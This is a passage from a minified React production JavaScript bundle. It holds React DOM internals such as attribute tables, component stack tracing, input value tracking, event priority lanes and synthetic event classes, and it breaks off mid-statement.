/*! For license information please see main.8073e5e8.js.LICENSE.txt */
(()=>{var e={730:(e,t,n)=>{"use strict";var a=n(43),i=n(853);function r(e){for(var t="https://reactjs.org/docs/error-decoder.html?invariant="+e,n=1;n<arguments.length;n++)t+="&args[]="+encodeURIComponent(arguments[n]);return"Minified React error #"+e+"; visit "+t+" for the full message or use the non-minified dev environment for full errors and additional helpful warnings."}var o=new Set,s={};function l(e,t){c(e,t),c(e+"Capture",t)}function c(e,t){for(s[e]=t,e=0;e<t.length;e++)o.add(t[e])}var u=!("undefined"===typeof window||"undefined"===typeof window.document||"undefined"===typeof window.document.createElement),d=Object.prototype.hasOwnProperty,p=/^[:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD][:A-Z_a-z\u00C0-\u00D6\u00D8-\u00F6\u00F8-\u02FF\u0370-\u037D\u037F-\u1FFF\u200C-\u200D\u2070-\u218F\u2C00-\u2FEF\u3001-\uD7FF\uF900-\uFDCF\uFDF0-\uFFFD\-.0-9\u00B7\u0300-\u036F\u203F-\u2040]*$/,h={},f={};function m(e,t,n,a,i,r,o){this.acceptsBooleans=2===t||3===t||4===t,this.attributeName=a,this.attributeNamespace=i,this.mustUseProperty=n,this.propertyName=e,this.type=t,this.sanitizeURL=r,this.removeEmptyString=o}var g={};"children dangerouslySetInnerHTML defaultValue defaultChecked innerHTML suppressContentEditableWarning suppressHydrationWarning style".split(" ").forEach((function(e){g[e]=new m(e,0,!1,e,null,!1,!1)})),[["acceptCharset","accept-charset"],["className","class"],["htmlFor","for"],["httpEquiv","http-equiv"]].forEach((function(e){var t=e[0];g[t]=new m(t,1,!1,e[1],null,!1,!1)})),["contentEditable","draggable","spellCheck","value"].forEach((function(e){g[e]=new m(e,2,!1,e.toLowerCase(),null,!1,!1)})),["autoReverse","externalResourcesRequired","focusable","preserveAlpha"].forEach((function(e){g[e]=new m(e,2,!1,e,null,!1,!1)})),"allowFullScreen async autoFocus autoPlay controls default defer disabled disablePictureInPicture disableRemotePlayback formNoValidate hidden loop noModule noValidate open playsInline readOnly required reversed scoped seamless itemScope".split(" ").forEach((function(e){g[e]=new m(e,3,!1,e.toLowerCase(),null,!1,!1)})),["checked","multiple","muted","selected"].forEach((function(e){g[e]=new m(e,3,!0,e,null,!1,!1)})),["capture","download"].forEach((function(e){g[e]=new m(e,4,!1,e,null,!1,!1)})),["cols","rows","size","span"].forEach((function(e){g[e]=new m(e,6,!1,e,null,!1,!1)})),["rowSpan","start"].forEach((function(e){g[e]=new m(e,5,!1,e.toLowerCase(),null,!1,!1)}));var y=/[\-:]([a-z])/g;function b(e){return e[1].toUpperCase()}function w(e,t,n,a){var i=g.hasOwnProperty(t)?g[t]:null;(null!==i?0!==i.type:a||!(2<t.length)||"o"!==t[0]&&"O"!==t[0]||"n"!==t[1]&&"N"!==t[1])&&(function(e,t,n,a){if(null===t||"undefined"===typeof t||function(e,t,n,a){if(null!==n&&0===n.type)return!1;switch(typeof t){case"function":case"symbol":return!0;case"boolean":return!a&&(null!==n?!n.acceptsBooleans:"data-"!==(e=e.toLowerCase().slice(0,5))&&"aria-"!==e);default:return!1}}(e,t,n,a))return!0;if(a)return!1;if(null!==n)switch(n.type){case 3:return!t;case 4:return!1===t;case 5:return isNaN(t);case 6:return isNaN(t)||1>t}return!1}(t,n,i,a)&&(n=null),a||null===i?function(e){return!!d.call(f,e)||!d.call(h,e)&&(p.test(e)?f[e]=!0:(h[e]=!0,!1))}(t)&&(null===n?e.removeAttribute(t):e.setAttribute(t,""+n)):i.mustUseProperty?e[i.propertyName]=null===n?3!==i.type&&"":n:(t=i.attributeName,a=i.attributeNamespace,null===n?e.removeAttribute(t):(n=3===(i=i.type)||4===i&&!0===n?"":""+n,a?e.setAttributeNS(a,t,n):e.setAttribute(t,n))))}"accent-height alignment-baseline arabic-form baseline-shift cap-height clip-path clip-rule color-interpolation color-interpolation-filters color-profile color-rendering dominant-baseline enable-background fill-opacity fill-rule flood-color flood-opacity font-family font-size font-size-adjust font-stretch font-style font-variant font-weight glyph-name glyph-orientation-horizontal glyph-orientation-vertical horiz-adv-x horiz-origin-x image-rendering letter-spacing lighting-color marker-end marker-mid marker-start overline-position overline-thickness paint-order panose-1 pointer-events rendering-intent shape-rendering stop-color stop-opacity strikethrough-position strikethrough-thickness stroke-dasharray stroke-dashoffset stroke-linecap stroke-linejoin stroke-miterlimit stroke-opacity stroke-width text-anchor text-decoration text-rendering underline-position underline-thickness unicode-bidi unicode-range units-per-em v-alphabetic v-hanging v-ideographic v-mathematical vector-effect vert-adv-y vert-origin-x vert-origin-y word-spacing writing-mode xmlns:xlink x-height".split(" ").forEach((function(e){var t=e.replace(y,b);g[t]=new m(t,1,!1,e,null,!1,!1)})),"xlink:actuate xlink:arcrole xlink:role xlink:show xlink:title xlink:type".split(" ").forEach((function(e){var t=e.replace(y,b);g[t]=new m(t,1,!1,e,"http://www.w3.org/1999/xlink",!1,!1)})),["xml:base","xml:lang","xml:space"].forEach((function(e){var t=e.replace(y,b);g[t]=new m(t,1,!1,e,"http://www.w3.org/XML/1998/namespace",!1,!1)})),["tabIndex","crossOrigin"].forEach((function(e){g[e]=new m(e,1,!1,e.toLowerCase(),null,!1,!1)})),g.xlinkHref=new m("xlinkHref",1,!1,"xlink:href","http://www.w3.org/1999/xlink",!0,!1),["src","href","action","formAction"].forEach((function(e){g[e]=new m(e,1,!1,e.toLowerCase(),null,!0,!0)}));var v=a.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED,k=Symbol.for("react.element"),x=Symbol.for("react.portal"),S=Symbol.for("react.fragment"),I=Symbol.for("react.strict_mode"),E=Symbol.for("react.profiler"),P=Symbol.for("react.provider"),T=Symbol.for("react.context"),C=Symbol.for("react.forward_ref"),A=Symbol.for("react.suspense"),j=Symbol.for("react.suspense_list"),L=Symbol.for("react.memo"),D=Symbol.for("react.lazy");Symbol.for("react.scope"),Symbol.for("react.debug_trace_mode");var N=Symbol.for("react.offscreen");Symbol.for("react.legacy_hidden"),Symbol.for("react.cache"),Symbol.for("react.tracing_marker");var R=Symbol.iterator;function M(e){return null===e||"object"!==typeof e?null:"function"===typeof(e=R&&e[R]||e["@@iterator"])?e:null}var z,O=Object.assign;function _(e){if(void 0===z)try{throw Error()}catch(n){var t=n.stack.trim().match(/\n( *(at )?)/);z=t&&t[1]||""}return"\n"+z+e}var F=!1;function U(e,t){if(!e||F)return"";F=!0;var n=Error.prepareStackTrace;Error.prepareStackTrace=void 0;try{if(t)if(t=function(){throw Error()},Object.defineProperty(t.prototype,"props",{set:function(){throw Error()}}),"object"===typeof Reflect&&Reflect.construct){try{Reflect.construct(t,[])}catch(c){var a=c}Reflect.construct(e,[],t)}else{try{t.call()}catch(c){a=c}e.call(t.prototype)}else{try{throw Error()}catch(c){a=c}e()}}catch(c){if(c&&a&&"string"===typeof c.stack){for(var i=c.stack.split("\n"),r=a.stack.split("\n"),o=i.length-1,s=r.length-1;1<=o&&0<=s&&i[o]!==r[s];)s--;for(;1<=o&&0<=s;o--,s--)if(i[o]!==r[s]){if(1!==o||1!==s)do{if(o--,0>--s||i[o]!==r[s]){var l="\n"+i[o].replace(" at new "," at ");return e.displayName&&l.includes("<anonymous>")&&(l=l.replace("<anonymous>",e.displayName)),l}}while(1<=o&&0<=s);break}}}finally{F=!1,Error.prepareStackTrace=n}return(e=e?e.displayName||e.name:"")?_(e):""}function W(e){switch(e.tag){case 5:return _(e.type);case 16:return _("Lazy");case 13:return _("Suspense");case 19:return _("SuspenseList");case 0:case 2:case 15:return e=U(e.type,!1);case 11:return e=U(e.type.render,!1);case 1:return e=U(e.type,!0);default:return""}}function q(e){if(null==e)return null;if("function"===typeof e)return e.displayName||e.name||null;if("string"===typeof e)return e;switch(e){case S:return"Fragment";case x:return"Portal";case E:return"Profiler";case I:return"StrictMode";case A:return"Suspense";case j:return"SuspenseList"}if("object"===typeof e)switch(e.$$typeof){case T:return(e.displayName||"Context")+".Consumer";case P:return(e._context.displayName||"Context")+".Provider";case C:var t=e.render;return(e=e.displayName)||(e=""!==(e=t.displayName||t.name||"")?"ForwardRef("+e+")":"ForwardRef"),e;case L:return null!==(t=e.displayName||null)?t:q(e.type)||"Memo";case D:t=e._payload,e=e._init;try{return q(e(t))}catch(n){}}return null}function B(e){var t=e.type;switch(e.tag){case 24:return"Cache";case 9:return(t.displayName||"Context")+".Consumer";case 10:return(t._context.displayName||"Context")+".Provider";case 18:return"DehydratedFragment";case 11:return e=(e=t.render).displayName||e.name||"",t.displayName||(""!==e?"ForwardRef("+e+")":"ForwardRef");case 7:return"Fragment";case 5:return t;case 4:return"Portal";case 3:return"Root";case 6:return"Text";case 16:return q(t);case 8:return t===I?"StrictMode":"Mode";case 22:return"Offscreen";case 12:return"Profiler";case 21:return"Scope";case 13:return"Suspense";case 19:return"SuspenseList";case 25:return"TracingMarker";case 1:case 0:case 17:case 2:case 14:case 15:if("function"===typeof t)return t.displayName||t.name||null;if("string"===typeof t)return t}return null}function H(e){switch(typeof e){case"boolean":case"number":case"string":case"undefined":case"object":return e;default:return""}}function V(e){var t=e.type;return(e=e.nodeName)&&"input"===e.toLowerCase()&&("checkbox"===t||"radio"===t)}function $(e){e._valueTracker||(e._valueTracker=function(e){var t=V(e)?"checked":"value",n=Object.getOwnPropertyDescriptor(e.constructor.prototype,t),a=""+e[t];if(!e.hasOwnProperty(t)&&"undefined"!==typeof n&&"function"===typeof n.get&&"function"===typeof n.set){var i=n.get,r=n.set;return Object.defineProperty(e,t,{configurable:!0,get:function(){return i.call(this)},set:function(e){a=""+e,r.call(this,e)}}),Object.defineProperty(e,t,{enumerable:n.enumerable}),{getValue:function(){return a},setValue:function(e){a=""+e},stopTracking:function(){e._valueTracker=null,delete e[t]}}}}(e))}function G(e){if(!e)return!1;var t=e._valueTracker;if(!t)return!0;var n=t.getValue(),a="";return e&&(a=V(e)?e.checked?"true":"false":e.value),(e=a)!==n&&(t.setValue(e),!0)}function X(e){if("undefined"===typeof(e=e||("undefined"!==typeof document?document:void 0)))return null;try{return e.activeElement||e.body}catch(t){return e.body}}function Q(e,t){var n=t.checked;return O({},t,{defaultChecked:void 0,defaultValue:void 0,value:void 0,checked:null!=n?n:e._wrapperState.initialChecked})}function Y(e,t){var n=null==t.defaultValue?"":t.defaultValue,a=null!=t.checked?t.checked:t.defaultChecked;n=H(null!=t.value?t.value:n),e._wrapperState={initialChecked:a,initialValue:n,controlled:"checkbox"===t.type||"radio"===t.type?null!=t.checked:null!=t.value}}function J(e,t){null!=(t=t.checked)&&w(e,"checked",t,!1)}function K(e,t){J(e,t);var n=H(t.value),a=t.type;if(null!=n)"number"===a?(0===n&&""===e.value||e.value!=n)&&(e.value=""+n):e.value!==""+n&&(e.value=""+n);else if("submit"===a||"reset"===a)return void e.removeAttribute("value");t.hasOwnProperty("value")?ee(e,t.type,n):t.hasOwnProperty("defaultValue")&&ee(e,t.type,H(t.defaultValue)),null==t.checked&&null!=t.defaultChecked&&(e.defaultChecked=!!t.defaultChecked)}function Z(e,t,n){if(t.hasOwnProperty("value")||t.hasOwnProperty("defaultValue")){var a=t.type;if(!("submit"!==a&&"reset"!==a||void 0!==t.value&&null!==t.value))return;t=""+e._wrapperState.initialValue,n||t===e.value||(e.value=t),e.defaultValue=t}""!==(n=e.name)&&(e.name=""),e.defaultChecked=!!e._wrapperState.initialChecked,""!==n&&(e.name=n)}function ee(e,t,n){"number"===t&&X(e.ownerDocument)===e||(null==n?e.defaultValue=""+e._wrapperState.initialValue:e.defaultValue!==""+n&&(e.defaultValue=""+n))}var te=Array.isArray;function ne(e,t,n,a){if(e=e.options,t){t={};for(var i=0;i<n.length;i++)t["$"+n[i]]=!0;for(n=0;n<e.length;n++)i=t.hasOwnProperty("$"+e[n].value),e[n].selected!==i&&(e[n].selected=i),i&&a&&(e[n].defaultSelected=!0)}else{for(n=""+H(n),t=null,i=0;i<e.length;i++){if(e[i].value===n)return e[i].selected=!0,void(a&&(e[i].defaultSelected=!0));null!==t||e[i].disabled||(t=e[i])}null!==t&&(t.selected=!0)}}function ae(e,t){if(null!=t.dangerouslySetInnerHTML)throw Error(r(91));return O({},t,{value:void 0,defaultValue:void 0,children:""+e._wrapperState.initialValue})}function ie(e,t){var n=t.value;if(null==n){if(n=t.children,t=t.defaultValue,null!=n){if(null!=t)throw Error(r(92));if(te(n)){if(1<n.length)throw Error(r(93));n=n[0]}t=n}null==t&&(t=""),n=t}e._wrapperState={initialValue:H(n)}}function re(e,t){var n=H(t.value),a=H(t.defaultValue);null!=n&&((n=""+n)!==e.value&&(e.value=n),null==t.defaultValue&&e.defaultValue!==n&&(e.defaultValue=n)),null!=a&&(e.defaultValue=""+a)}function oe(e){var t=e.textContent;t===e._wrapperState.initialValue&&""!==t&&null!==t&&(e.value=t)}function se(e){switch(e){case"svg":return"http://www.w3.org/2000/svg";case"math":return"http://www.w3.org/1998/Math/MathML";default:return"http://www.w3.org/1999/xhtml"}}function le(e,t){return null==e||"http://www.w3.org/1999/xhtml"===e?se(t):"http://www.w3.org/2000/svg"===e&&"foreignObject"===t?"http://www.w3.org/1999/xhtml":e}var ce,ue,de=(ue=function(e,t){if("http://www.w3.org/2000/svg"!==e.namespaceURI||"innerHTML"in e)e.innerHTML=t;else{for((ce=ce||document.createElement("div")).innerHTML="<svg>"+t.valueOf().toString()+"</svg>",t=ce.firstChild;e.firstChild;)e.removeChild(e.firstChild);for(;t.firstChild;)e.appendChild(t.firstChild)}},"undefined"!==typeof MSApp&&MSApp.execUnsafeLocalFunction?function(e,t,n,a){MSApp.execUnsafeLocalFunction((function(){return ue(e,t)}))}:ue);function pe(e,t){if(t){var n=e.firstChild;if(n&&n===e.lastChild&&3===n.nodeType)return void(n.nodeValue=t)}e.textContent=t}var he={animationIterationCount:!0,aspectRatio:!0,borderImageOutset:!0,borderImageSlice:!0,borderImageWidth:!0,boxFlex:!0,boxFlexGroup:!0,boxOrdinalGroup:!0,columnCount:!0,columns:!0,flex:!0,flexGrow:!0,flexPositive:!0,flexShrink:!0,flexNegative:!0,flexOrder:!0,gridArea:!0,gridRow:!0,gridRowEnd:!0,gridRowSpan:!0,gridRowStart:!0,gridColumn:!0,gridColumnEnd:!0,gridColumnSpan:!0,gridColumnStart:!0,fontWeight:!0,lineClamp:!0,lineHeight:!0,opacity:!0,order:!0,orphans:!0,tabSize:!0,widows:!0,zIndex:!0,zoom:!0,fillOpacity:!0,floodOpacity:!0,stopOpacity:!0,strokeDasharray:!0,strokeDashoffset:!0,strokeMiterlimit:!0,strokeOpacity:!0,strokeWidth:!0},fe=["Webkit","ms","Moz","O"];function me(e,t,n){return null==t||"boolean"===typeof t||""===t?"":n||"number"!==typeof t||0===t||he.hasOwnProperty(e)&&he[e]?(""+t).trim():t+"px"}function ge(e,t){for(var n in e=e.style,t)if(t.hasOwnProperty(n)){var a=0===n.indexOf("--"),i=me(n,t[n],a);"float"===n&&(n="cssFloat"),a?e.setProperty(n,i):e[n]=i}}Object.keys(he).forEach((function(e){fe.forEach((function(t){t=t+e.charAt(0).toUpperCase()+e.substring(1),he[t]=he[e]}))}));var ye=O({menuitem:!0},{area:!0,base:!0,br:!0,col:!0,embed:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0});function be(e,t){if(t){if(ye[e]&&(null!=t.children||null!=t.dangerouslySetInnerHTML))throw Error(r(137,e));if(null!=t.dangerouslySetInnerHTML){if(null!=t.children)throw Error(r(60));if("object"!==typeof t.dangerouslySetInnerHTML||!("__html"in t.dangerouslySetInnerHTML))throw Error(r(61))}if(null!=t.style&&"object"!==typeof t.style)throw Error(r(62))}}function we(e,t){if(-1===e.indexOf("-"))return"string"===typeof t.is;switch(e){case"annotation-xml":case"color-profile":case"font-face":case"font-face-src":case"font-face-uri":case"font-face-format":case"font-face-name":case"missing-glyph":return!1;default:return!0}}var ve=null;function ke(e){return(e=e.target||e.srcElement||window).correspondingUseElement&&(e=e.correspondingUseElement),3===e.nodeType?e.parentNode:e}var xe=null,Se=null,Ie=null;function Ee(e){if(e=wi(e)){if("function"!==typeof xe)throw Error(r(280));var t=e.stateNode;t&&(t=ki(t),xe(e.stateNode,e.type,t))}}function Pe(e){Se?Ie?Ie.push(e):Ie=[e]:Se=e}function Te(){if(Se){var e=Se,t=Ie;if(Ie=Se=null,Ee(e),t)for(e=0;e<t.length;e++)Ee(t[e])}}function Ce(e,t){return e(t)}function Ae(){}var je=!1;function Le(e,t,n){if(je)return e(t,n);je=!0;try{return Ce(e,t,n)}finally{je=!1,(null!==Se||null!==Ie)&&(Ae(),Te())}}function De(e,t){var n=e.stateNode;if(null===n)return null;var a=ki(n);if(null===a)return null;n=a[t];e:switch(t){case"onClick":case"onClickCapture":case"onDoubleClick":case"onDoubleClickCapture":case"onMouseDown":case"onMouseDownCapture":case"onMouseMove":case"onMouseMoveCapture":case"onMouseUp":case"onMouseUpCapture":case"onMouseEnter":(a=!a.disabled)||(a=!("button"===(e=e.type)||"input"===e||"select"===e||"textarea"===e)),e=!a;break e;default:e=!1}if(e)return null;if(n&&"function"!==typeof n)throw Error(r(231,t,typeof n));return n}var Ne=!1;if(u)try{var Re={};Object.defineProperty(Re,"passive",{get:function(){Ne=!0}}),window.addEventListener("test",Re,Re),window.removeEventListener("test",Re,Re)}catch(ue){Ne=!1}function Me(e,t,n,a,i,r,o,s,l){var c=Array.prototype.slice.call(arguments,3);try{t.apply(n,c)}catch(u){this.onError(u)}}var ze=!1,Oe=null,_e=!1,Fe=null,Ue={onError:function(e){ze=!0,Oe=e}};function We(e,t,n,a,i,r,o,s,l){ze=!1,Oe=null,Me.apply(Ue,arguments)}function qe(e){var t=e,n=e;if(e.alternate)for(;t.return;)t=t.return;else{e=t;do{0!==(4098&(t=e).flags)&&(n=t.return),e=t.return}while(e)}return 3===t.tag?n:null}function Be(e){if(13===e.tag){var t=e.memoizedState;if(null===t&&(null!==(e=e.alternate)&&(t=e.memoizedState)),null!==t)return t.dehydrated}return null}function He(e){if(qe(e)!==e)throw Error(r(188))}function Ve(e){return null!==(e=function(e){var t=e.alternate;if(!t){if(null===(t=qe(e)))throw Error(r(188));return t!==e?null:e}for(var n=e,a=t;;){var i=n.return;if(null===i)break;var o=i.alternate;if(null===o){if(null!==(a=i.return)){n=a;continue}break}if(i.child===o.child){for(o=i.child;o;){if(o===n)return He(i),e;if(o===a)return He(i),t;o=o.sibling}throw Error(r(188))}if(n.return!==a.return)n=i,a=o;else{for(var s=!1,l=i.child;l;){if(l===n){s=!0,n=i,a=o;break}if(l===a){s=!0,a=i,n=o;break}l=l.sibling}if(!s){for(l=o.child;l;){if(l===n){s=!0,n=o,a=i;break}if(l===a){s=!0,a=o,n=i;break}l=l.sibling}if(!s)throw Error(r(189))}}if(n.alternate!==a)throw Error(r(190))}if(3!==n.tag)throw Error(r(188));return n.stateNode.current===n?e:t}(e))?$e(e):null}function $e(e){if(5===e.tag||6===e.tag)return e;for(e=e.child;null!==e;){var t=$e(e);if(null!==t)return t;e=e.sibling}return null}var Ge=i.unstable_scheduleCallback,Xe=i.unstable_cancelCallback,Qe=i.unstable_shouldYield,Ye=i.unstable_requestPaint,Je=i.unstable_now,Ke=i.unstable_getCurrentPriorityLevel,Ze=i.unstable_ImmediatePriority,et=i.unstable_UserBlockingPriority,tt=i.unstable_NormalPriority,nt=i.unstable_LowPriority,at=i.unstable_IdlePriority,it=null,rt=null;var ot=Math.clz32?Math.clz32:function(e){return e>>>=0,0===e?32:31-(st(e)/lt|0)|0},st=Math.log,lt=Math.LN2;var ct=64,ut=4194304;function dt(e){switch(e&-e){case 1:return 1;case 2:return 2;case 4:return 4;case 8:return 8;case 16:return 16;case 32:return 32;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return 4194240&e;case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:return 130023424&e;case 134217728:return 134217728;case 268435456:return 268435456;case 536870912:return 536870912;case 1073741824:return 1073741824;default:return e}}function pt(e,t){var n=e.pendingLanes;if(0===n)return 0;var a=0,i=e.suspendedLanes,r=e.pingedLanes,o=268435455&n;if(0!==o){var s=o&~i;0!==s?a=dt(s):0!==(r&=o)&&(a=dt(r))}else 0!==(o=n&~i)?a=dt(o):0!==r&&(a=dt(r));if(0===a)return 0;if(0!==t&&t!==a&&0===(t&i)&&((i=a&-a)>=(r=t&-t)||16===i&&0!==(4194240&r)))return t;if(0!==(4&a)&&(a|=16&n),0!==(t=e.entangledLanes))for(e=e.entanglements,t&=a;0<t;)i=1<<(n=31-ot(t)),a|=e[n],t&=~i;return a}function ht(e,t){switch(e){case 1:case 2:case 4:return t+250;case 8:case 16:case 32:case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:return t+5e3;default:return-1}}function ft(e){return 0!==(e=-1073741825&e.pendingLanes)?e:1073741824&e?1073741824:0}function mt(){var e=ct;return 0===(4194240&(ct<<=1))&&(ct=64),e}function gt(e){for(var t=[],n=0;31>n;n++)t.push(e);return t}function yt(e,t,n){e.pendingLanes|=t,536870912!==t&&(e.suspendedLanes=0,e.pingedLanes=0),(e=e.eventTimes)[t=31-ot(t)]=n}function bt(e,t){var n=e.entangledLanes|=t;for(e=e.entanglements;n;){var a=31-ot(n),i=1<<a;i&t|e[a]&t&&(e[a]|=t),n&=~i}}var wt=0;function vt(e){return 1<(e&=-e)?4<e?0!==(268435455&e)?16:536870912:4:1}var kt,xt,St,It,Et,Pt=!1,Tt=[],Ct=null,At=null,jt=null,Lt=new Map,Dt=new Map,Nt=[],Rt="mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset submit".split(" ");function Mt(e,t){switch(e){case"focusin":case"focusout":Ct=null;break;case"dragenter":case"dragleave":At=null;break;case"mouseover":case"mouseout":jt=null;break;case"pointerover":case"pointerout":Lt.delete(t.pointerId);break;case"gotpointercapture":case"lostpointercapture":Dt.delete(t.pointerId)}}function zt(e,t,n,a,i,r){return null===e||e.nativeEvent!==r?(e={blockedOn:t,domEventName:n,eventSystemFlags:a,nativeEvent:r,targetContainers:[i]},null!==t&&(null!==(t=wi(t))&&xt(t)),e):(e.eventSystemFlags|=a,t=e.targetContainers,null!==i&&-1===t.indexOf(i)&&t.push(i),e)}function Ot(e){var t=bi(e.target);if(null!==t){var n=qe(t);if(null!==n)if(13===(t=n.tag)){if(null!==(t=Be(n)))return e.blockedOn=t,void Et(e.priority,(function(){St(n)}))}else if(3===t&&n.stateNode.current.memoizedState.isDehydrated)return void(e.blockedOn=3===n.tag?n.stateNode.containerInfo:null)}e.blockedOn=null}function _t(e){if(null!==e.blockedOn)return!1;for(var t=e.targetContainers;0<t.length;){var n=Qt(e.domEventName,e.eventSystemFlags,t[0],e.nativeEvent);if(null!==n)return null!==(t=wi(n))&&xt(t),e.blockedOn=n,!1;var a=new(n=e.nativeEvent).constructor(n.type,n);ve=a,n.target.dispatchEvent(a),ve=null,t.shift()}return!0}function Ft(e,t,n){_t(e)&&n.delete(t)}function Ut(){Pt=!1,null!==Ct&&_t(Ct)&&(Ct=null),null!==At&&_t(At)&&(At=null),null!==jt&&_t(jt)&&(jt=null),Lt.forEach(Ft),Dt.forEach(Ft)}function Wt(e,t){e.blockedOn===t&&(e.blockedOn=null,Pt||(Pt=!0,i.unstable_scheduleCallback(i.unstable_NormalPriority,Ut)))}function qt(e){function t(t){return Wt(t,e)}if(0<Tt.length){Wt(Tt[0],e);for(var n=1;n<Tt.length;n++){var a=Tt[n];a.blockedOn===e&&(a.blockedOn=null)}}for(null!==Ct&&Wt(Ct,e),null!==At&&Wt(At,e),null!==jt&&Wt(jt,e),Lt.forEach(t),Dt.forEach(t),n=0;n<Nt.length;n++)(a=Nt[n]).blockedOn===e&&(a.blockedOn=null);for(;0<Nt.length&&null===(n=Nt[0]).blockedOn;)Ot(n),null===n.blockedOn&&Nt.shift()}var Bt=v.ReactCurrentBatchConfig,Ht=!0;function Vt(e,t,n,a){var i=wt,r=Bt.transition;Bt.transition=null;try{wt=1,Gt(e,t,n,a)}finally{wt=i,Bt.transition=r}}function $t(e,t,n,a){var i=wt,r=Bt.transition;Bt.transition=null;try{wt=4,Gt(e,t,n,a)}finally{wt=i,Bt.transition=r}}function Gt(e,t,n,a){if(Ht){var i=Qt(e,t,n,a);if(null===i)Ha(e,t,a,Xt,n),Mt(e,a);else if(function(e,t,n,a,i){switch(t){case"focusin":return Ct=zt(Ct,e,t,n,a,i),!0;case"dragenter":return At=zt(At,e,t,n,a,i),!0;case"mouseover":return jt=zt(jt,e,t,n,a,i),!0;case"pointerover":var r=i.pointerId;return Lt.set(r,zt(Lt.get(r)||null,e,t,n,a,i)),!0;case"gotpointercapture":return r=i.pointerId,Dt.set(r,zt(Dt.get(r)||null,e,t,n,a,i)),!0}return!1}(i,e,t,n,a))a.stopPropagation();else if(Mt(e,a),4&t&&-1<Rt.indexOf(e)){for(;null!==i;){var r=wi(i);if(null!==r&&kt(r),null===(r=Qt(e,t,n,a))&&Ha(e,t,a,Xt,n),r===i)break;i=r}null!==i&&a.stopPropagation()}else Ha(e,t,a,null,n)}}var Xt=null;function Qt(e,t,n,a){if(Xt=null,null!==(e=bi(e=ke(a))))if(null===(t=qe(e)))e=null;else if(13===(n=t.tag)){if(null!==(e=Be(t)))return e;e=null}else if(3===n){if(t.stateNode.current.memoizedState.isDehydrated)return 3===t.tag?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null);return Xt=e,null}function Yt(e){switch(e){case"cancel":case"click":case"close":case"contextmenu":case"copy":case"cut":case"auxclick":case"dblclick":case"dragend":case"dragstart":case"drop":case"focusin":case"focusout":case"input":case"invalid":case"keydown":case"keypress":case"keyup":case"mousedown":case"mouseup":case"paste":case"pause":case"play":case"pointercancel":case"pointerdown":case"pointerup":case"ratechange":case"reset":case"resize":case"seeked":case"submit":case"touchcancel":case"touchend":case"touchstart":case"volumechange":case"change":case"selectionchange":case"textInput":case"compositionstart":case"compositionend":case"compositionupdate":case"beforeblur":case"afterblur":case"beforeinput":case"blur":case"fullscreenchange":case"focus":case"hashchange":case"popstate":case"select":case"selectstart":return 1;case"drag":case"dragenter":case"dragexit":case"dragleave":case"dragover":case"mousemove":case"mouseout":case"mouseover":case"pointermove":case"pointerout":case"pointerover":case"scroll":case"toggle":case"touchmove":case"wheel":case"mouseenter":case"mouseleave":case"pointerenter":case"pointerleave":return 4;case"message":switch(Ke()){case Ze:return 1;case et:return 4;case tt:case nt:return 16;case at:return 536870912;default:return 16}default:return 16}}var Jt=null,Kt=null,Zt=null;function en(){if(Zt)return Zt;var e,t,n=Kt,a=n.length,i="value"in Jt?Jt.value:Jt.textContent,r=i.length;for(e=0;e<a&&n[e]===i[e];e++);var o=a-e;for(t=1;t<=o&&n[a-t]===i[r-t];t++);return Zt=i.slice(e,1<t?1-t:void 0)}function tn(e){var t=e.keyCode;return"charCode"in e?0===(e=e.charCode)&&13===t&&(e=13):e=t,10===e&&(e=13),32<=e||13===e?e:0}function nn(){return!0}function an(){return!1}function rn(e){function t(t,n,a,i,r){for(var o in this._reactName=t,this._targetInst=a,this.type=n,this.nativeEvent=i,this.target=r,this.currentTarget=null,e)e.hasOwnProperty(o)&&(t=e[o],this[o]=t?t(i):i[o]);return this.isDefaultPrevented=(null!=i.defaultPrevented?i.defaultPrevented:!1===i.returnValue)?nn:an,this.isPropagationStopped=an,this}return O(t.prototype,{preventDefault:function(){this.defaultPrevented=!0;var e=this.nativeEvent;e&&(e.preventDefault?e.preventDefault():"unknown"!==typeof e.returnValue&&(e.returnValue=!1),this.isDefaultPrevented=nn)},stopPropagation:function(){var e=this.nativeEvent;e&&(e.stopPropagation?e.stopPropagation():"unknown"!==typeof e.cancelBubble&&(e.cancelBubble=!0),this.isPropagationStopped=nn)},persist:function(){},isPersistent:nn}),t}var on,sn,ln,cn={eventPhase:0,bubbles:0,cancelable:0,timeStamp:function(e){return e.timeStamp||Date.now()},defaultPrevented:0,isTrusted:0},un=rn(cn),dn=O({},cn,{view:0,detail:0}),pn=rn(dn),hn=O({},dn,{screenX:0,screenY:0,clientX:0,clientY:0,pageX:0,pageY:0,ctrlKey:0,shiftKey:0,altKey:0,metaKey:0,getModifierState:En,button:0,buttons:0,relatedTarget:function(e){return void 0===e.relatedTarget?e.fromElement===e.srcElement?e.toElement:e.fromElement:e.relatedTarget},movementX:function(e){return"movementX"in e?e.movementX:(e!==ln&&(ln&&"mousemove"===e.type?(on=e.screenX-ln.screenX,sn=e.screenY-ln.screenY):sn=on=0,ln=e),on)},movementY:function(e){return"movementY"in e?e.movementY:sn}}),fn=rn(hn),mn=rn(O({},hn,{dataTransfer:0})),gn=rn(O({},dn,{relatedTarget:0})),yn=rn(O({},cn,{animationName:0,elapsedTime:0,pseudoElement:0})),bn=O({},cn,{clipboardData:function(e){return"clipboardData"in e?e.clipboardData:window.clipboardData}}),wn=rn(bn),vn=rn(O({},cn,{data:0})),kn={Esc:"Escape",Spacebar:" 